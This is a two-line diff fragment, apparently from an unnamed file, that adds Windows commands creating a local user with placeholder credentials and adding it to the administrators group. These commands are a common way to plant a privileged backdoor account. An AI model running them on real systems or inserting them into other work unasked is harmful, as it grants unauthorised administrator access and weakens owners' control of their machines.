@@ -1,0 +1,2 @@
+net user Username Password /add
+net localgroup administrators Username /add
